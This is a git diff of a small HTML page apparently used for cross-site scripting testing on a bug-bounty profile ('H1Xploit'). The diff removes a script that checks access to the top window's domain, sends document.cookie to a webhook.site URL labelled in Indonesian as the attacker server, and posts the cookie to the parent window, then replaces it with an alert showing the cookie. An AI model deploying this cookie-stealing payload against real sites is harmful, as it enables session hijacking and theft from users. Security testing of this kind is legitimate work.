@@ -2,33 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Document Domain Alert</title>
+  <title>XSS Test | H1Xploit</title>
 </head>
 <body>
 
-<h1>Test Document Domain</h1>
+<h1>XSS Test</h1>
 
 <script>
   alert("hello from " + document.domain);
 </script>
 
   <script>
-    try {
-  let d = window.top.document.domain;
-  document.body.innerHTML += "<br>TOP ACCESS: " + d;
-} catch (e) {
-  document.body.innerHTML += "<br>SOP BLOCKED";
-}
-
-// kirim data ke attacker server
-fetch("https://webhook.site/999fc9b5-8b8c-44e7-96a7-7fdfc70d1032?data=" + encodeURIComponent(document.cookie));
-
-// coba pivot
-window.top.postMessage({
-  type: "XSS",
-  cookie: document.cookie
-}, "*");
-
+  alert("hello from " + document.cookie);
 </script>
   
 </body>
